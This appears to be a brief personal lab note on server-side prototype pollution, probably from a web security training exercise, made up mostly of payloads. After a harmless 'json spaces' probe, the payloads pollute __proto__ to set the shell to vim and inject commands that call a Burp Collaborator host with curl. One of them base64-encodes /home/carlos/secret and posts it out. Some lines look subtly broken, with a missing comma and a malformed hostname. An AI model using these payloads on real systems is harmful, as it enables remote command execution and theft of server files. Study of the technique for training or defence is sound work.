![[Pasted image 20230604063601.png]]

![[Pasted image 20230604063620.png]]

payloads:

"__proto__": {
	"json spaces":10
}


"__proto__": {
	"shell":"vim"
	"input": "! curl https://BURP-COLLABORATOR-IP.oastify.com\n"
}

"input":":! /home/carlos | base64 | curl -d @- https://BURP-COLLABORATOR-IP.,oastify.com\n"

"input":":! /home/carlos/secret | base64 | curl -d @- https://BURP-COLLABORATOR-IP.,oastify.com\n"


